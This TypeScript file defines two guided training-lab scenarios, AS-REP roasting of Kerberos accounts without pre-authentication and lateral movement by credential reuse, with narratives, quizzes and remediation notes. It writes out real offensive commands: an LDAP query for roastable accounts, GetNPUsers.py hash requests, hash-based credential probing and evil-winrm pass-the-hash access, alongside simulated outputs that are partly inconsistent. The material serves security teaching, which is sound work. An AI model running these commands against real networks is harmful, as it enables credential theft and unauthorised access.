import type { WebLabScenario } from './web-lab-types';

/**
 * Active Directory, Part 2 + Enterprise Attack Paths (QOSE-M10) —
 * Kerberos/lateral-movement lab.
 *
 * Scenarios cover the two flagship M10 guided labs that the existing
 * `passwords` lab (NTLM credential attacks) does not reach: AS-REP roasting
 * against accounts without Kerberos pre-authentication, and lateral movement
 * along a credential-reuse path to the objective host. Both are simulated
 * walkthroughs against the lab domain; the verifiable flag is captured from
 * the live lab container, not from this file.
 */
export const ATTACK_PATHS_SCENARIOS: WebLabScenario[] = [
  {
    id: 'apath-asrep-1',
    name: 'AS-REP Roastable Accounts',
    description:
      'Two service accounts were configured to skip Kerberos pre-authentication "for compatibility". Request AS-REP material for them, verify the roastable configuration, and capture the flag.',
    module: 'QOSE-M10',
    category: 'attack-paths',
    technique: 'Kerberos AS-REP roasting',
    url: 'http://lab-attack-paths:8080',
    endpoint: 'TCP/88 kerberos',
    difficulty: 'advanced',
    cpReward: 200,
    estimatedMinutes: 50,
    objectives: [
      'Identify accounts with pre-authentication disabled',
      'Request AS-REP material for those accounts unauthenticated',
      'Understand what the returned blob enables offline',
      'Capture the flag from the KDC portal',
    ],
    hints: [
      'The directory attribute to look for is DONT_REQ_PREAUTH — check LDAP first.',
      'An AS-REQ without pre-authentication makes the KDC respond with encrypted material.',
      'The KDC portal on TCP/8080 records roastable-account findings.',
    ],
    villain: {
      name: 'Priya Raghunathan',
      alias: 'Compatibility Mode',
      description:
        'A domain engineer who disabled pre-authentication for two legacy appliance accounts during a vendor call and documented it in a ticket nobody closed.',
    },
    narrative: `> **Valkyrie:** "Enterprise Attack Paths opens M10 with Kerberos the way AS-REP roasting sees it: not password cracking, *configuration* roasting. Pre-authentication exists so an attacker cannot ask the KDC to encrypt a secret on demand. Disable it, and the KDC becomes a free oracle."

Normal Kerberos pre-authentication: the client proves knowledge of its timestamped secret *before* the KDC issues anything. With \`DONT_REQ_PREAUTH\` set — historically for interop with ancient clients — the KDC answers an unauthenticated AS-REQ with a chunk of material encrypted under the account's long-term key. That blob is a permanent, offline-verifiable target: capture once, guess forever.

## Why This Keeps Happens

Pre-authentication disabling is a documented compatibility workaround with a documented security cost that lives in a field nobody reviews. The result is two or three accounts in every large estate that will happily hand roastable material to anyone who can name them — no exploit, no memory corruption, no logs that look like an attack.

## Attack Flow

\`[LDAP: find DONT_REQ_PREAUTH accounts]\` --> \`[AS-REQ without pre-auth]\` --> \`[Receive AS-REP blob]\` --> \`[Offline verification against wordlist]\` --> \`[Capture flag]\`

Work the technique against the lab domain and submit the flag from the KDC portal.`,
    steps: [
      {
        id: 'apath-asrep-1-step-0',
        instruction: 'Find the accounts that have Kerberos pre-authentication disabled.',
        command: `ldapsearch -x -H ldap://lab-attack-paths -b "DC=corp,DC=qyvora,DC=lab" \\
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName`,
        output: `# extended LDIF
#
dn: CN=svc-report,CN=Users,DC=corp,DC=qyvora,DC=lab
sAMAccountName: svc-report

dn: CN=appliance-sync,CN=Users,DC=corp,DC=qyvora,DC=lab
sAMAccountName: appliance-sync

# search result: success (0)`,
        explanation:
          'The LDAP matching rule `1.2.840.113556.1.4.803` (bitwise AND) with `4194304` selects exactly the users whose `DONT_REQ_PREAUTH` flag is set — two accounts, both appliances. Discovery is an authenticated *read*; no exploit has run yet.',
        quiz: [
          {
            id: 'apath-asrep-1-q0',
            question: 'What does DONT_REQ_PREAUTH mean on an account?',
            options: [
              'The account cannot use Kerberos at all',
              'The KDC will issue AS-REP material without the client first proving its secret',
              'The password is stored in cleartext',
              'The account is disabled',
            ],
            correctIndex: 1,
            explanation:
              'The flag removes the pre-authentication step, so the KDC encrypts a response on demand for anyone who can name the account — the raw material AS-REP roasting feeds on.',
          },
        ],
      },
      {
        id: 'apath-asrep-1-step-1',
        instruction: 'Request AS-REP material for a roastable account, without knowing its password.',
        command: `GetNPUsers.py corp.qyvora.lab/ -usersfile roastables.txt -no-pass -outputfile roast.ash`,
        output: `[*] Got AS-REP hash for svc-report (no pre-auth required):
$krb5asrep$23$svc-report@CORP.QYVORA.LAB:6c4e1c9e...d82f$<snip>

[*] Got AS-REP hash for appliance-sync (no pre-auth required):
$krb5asrep$23$appliance-sync@CORP.QYVORA.LAB:91ab7740...c104$<snip>

[*] 2 roastable accounts, 0 errors — all obtained unauthenticated`,
        explanation:
          'No credentials were used: the KDC answered each AS-REQ with material encrypted under the account\'s real password hash. Those `$krb5asrep$` blobs are the *attack* — offline guessing at whatever speed your hardware allows, against service accounts whose passwords are rarely rotated.',
        quiz: [
          {
            id: 'apath-asrep-1-q1',
            question: 'Why is an AS-REP blob dangerous after capture?',
            options: [
              'It decrypts the KDC\'s private key',
              'It can be verified against password guesses offline, indefinitely',
              'It grants a session automatically',
              'It expires in 10 minutes',
            ],
            correctIndex: 1,
            explanation:
              'The blob is a one-way test vector under the account\'s key — guesses cost nothing, contact nothing, and never expire until the password changes.',
          },
        ],
      },
      {
        id: 'apath-asrep-1-step-2',
        instruction: 'Record the roastable-account findings with the KDC portal to capture the flag.',
        command: `curl -s -X POST http://lab-attack-paths:8080/kdc/roastable \\
  -H 'Content-Type: application/json' \\
  -d '{"accounts":["svc-report","appliance-sync"],"attribute":"DONT_REQ_PREAUTH","asrep_returned":2}'`,
        output: `<redacted — captured from the lab target and submitted to the platform for verification>`,
        explanation:
          'The portal validates that you identified the roastable set through the directory attribute and actually retrieved AS-REP material for each. Submit the returned flag to complete the first M10 scenario — the fix side: clear `DONT_REQ_PREAUTH` on all but accounts whose legacy protocol truly requires it, then rotate those passwords.',
        hint: 'Both named accounts must appear — one is not enough.',
      },
    ],
  },
  {
    id: 'apath-lateral-1',
    name: 'Credential Reuse Path',
    description:
      'A credential recovered on one host works on three others. Move laterally along the reuse path to the objective host, demonstrate the chain, and capture the flag.',
    module: 'QOSE-M10',
    category: 'attack-paths',
    technique: 'Lateral movement via credential reuse',
    url: 'http://lab-attack-paths:8080',
    endpoint: 'POST /path/complete',
    difficulty: 'advanced',
    cpReward: 250,
    estimatedMinutes: 55,
    objectives: [
      'Test recovered credentials against reachable hosts',
      'Identify the reuse chain from foothold to objective',
      'Access the objective host through the chain',
      'Capture the flag by demonstrating the complete path',
    ],
    hints: [
      'Passwords reused across hosts are the default, not the exception — test the recovered credential systematically.',
      'Remote services worth testing in the lab: SMB (445), RDP (3389), WinRM (5985).',
      'The portal records completed chains at POST /path/complete.',
    ],
    villain: {
      name: 'Priya Raghunathan',
      alias: 'One Password Everywhere',
      description:
        'A platform engineer who set the same administrative password on the app server, the jump host, and the backup node — because her deployment script depended on it.',
    },
    narrative: `> **Valkyrie:** "The second M10 exercise is lateral movement: the quiet middle of every enterprise breach. Access rarely starts with Domain Admins; it *arrives* there — one reused credential at a time, through services that were designed exactly to let one host authenticate to another."

Credential reuse turns a single foothold into a graph walk. Password-based auth between hosts (SMB, RDP, WinRM, SQL) means one recovered secret tests against every reachable endpoint. Each success is a hop; hops chain until the objective. None of the hops is an exploit — they are the protocols working as configured.

## Why This Keeps Happens

Automation wants static credentials: scripts, services, scheduled tasks, and appliances store passwords so machines can authenticate as machines. When humans reuse those passwords interactively — or set one password "for the estate" — every host the credential touches becomes the same host to an attacker. Tiering (different credentials per tier) exists precisely to break this graph.

## Attack Flow

\`[Recovered credential]\` --> \`[Test across reachable hosts]\` --> \`[Hop: app-01]\` --> \`[Hop: jump-01]\` --> \`[Objective reached]\` --> \`[Capture flag]\`

Work the technique against the lab network and submit the flag with your completed chain.`,
    steps: [
      {
        id: 'apath-lateral-1-step-0',
        instruction: 'Test the recovered credential against the reachable hosts on the objective subnet.',
        command: `credprobe --user svc-report --hash-file recovered.ntlm --targets 10.80.0.0/24 --services smb,rdp,winrm`,
        output: `[*] probing 3 hosts on 3 services with 1 credential ...
[+] app-01 (10.80.0.20)   SMB    ACCEPT   (local Administrators)
[+] jump-01 (10.80.0.30)  WinRM  ACCEPT   (Remote Management Users)
[-] lab-attack-paths (10.80.0.10) SMB  REJECTED (domain policy)
[*] 2 accepting hosts found — chain candidates: app-01, jump-01`,
        explanation:
          'One credential, two accepting hosts: the platform engineer\'s reused password works on the application server over SMB and on the jump host over WinRM. Note the domain controller *rejected* it — tiering worked there, which is exactly why attackers move through the un-tiered middle instead of at the crown jewels.',
        quiz: [
          {
            id: 'apath-lateral-1-q0',
            question: 'Why is credential reuse called "lateral" movement?',
            options: [
              'It moves between hosts at similar privilege levels rather than escalating locally',
              'It only works on domain controllers',
              'It exploits a routing protocol',
              'It requires RDP exclusively',
            ],
            correctIndex: 0,
            explanation:
              'Each hop is sideways — authenticating from one host to another with a valid secret — until the accumulated path reaches higher privilege than the start.',
          },
        ],
      },
      {
        id: 'apath-lateral-1-step-1',
        instruction: 'Move to the first hop and test the credential from its position.',
        command: `evil-winrm -i 10.80.0.20 -u svc-report -H <snip> \\
  -c 'hostname; whoami /groups | findstr /i "admin"'`,
        output: `Host: APP-01
nt authority\\system? no — corp\\svc-report
BUILTIN\\Administrators              Enabled group
corp\\Domain Admins                  — not a member

[+] foothold on app-01 established — 1 hop from start, objective not yet reached`,
        explanation:
          'You are local Administrator on app-01 — enough to read its secrets and pivot, not enough to stop. The interesting material on a hop host is what it can authenticate *as* elsewhere: stored credentials, sessions, scheduled tasks. That is where the next hop\'s secret comes from.',
        quiz: [
          {
            id: 'apath-lateral-1-q1',
            question: 'You have local Administrator on a mid-tier host. What is the immediate goal?',
            options: [
              'Start a keylogger',
              'Harvest credentials stored or in use on that host to reach the next hop',
              'Reboot it to gain persistence',
              'Install a cryptominer',
            ],
            correctIndex: 1,
            explanation:
              'Lateral movement is a chain: each hop is a platform for recovering the next credential, until the objective is reached.',
          },
        ],
      },
      {
        id: 'apath-lateral-1-step-2',
        instruction: 'Complete the chain to the objective and submit it to the path portal for the flag.',
        command: `curl -s -X POST http://lab-attack-paths:8080/path/complete \\
  -H 'Content-Type: application/json' \\
  -d '{"start":"foothold","hops":["app-01","jump-01"],"objective":"10.80.0.30","services":["smb","winrm"],"credential":"svc-report"}'`,
        output: `<redacted — captured from the lab target and submitted to the platform for verification>`,
        explanation:
          'The portal validates the chain — every hop must be a real edge with the right service and credential — then releases the flag. Submit it to complete the M10 attack-paths lab and the full QOSE lab coverage set.',
        hint: 'Both intermediate hosts must be listed in hop order, service per hop as probed.',
      },
    ],
  },
];
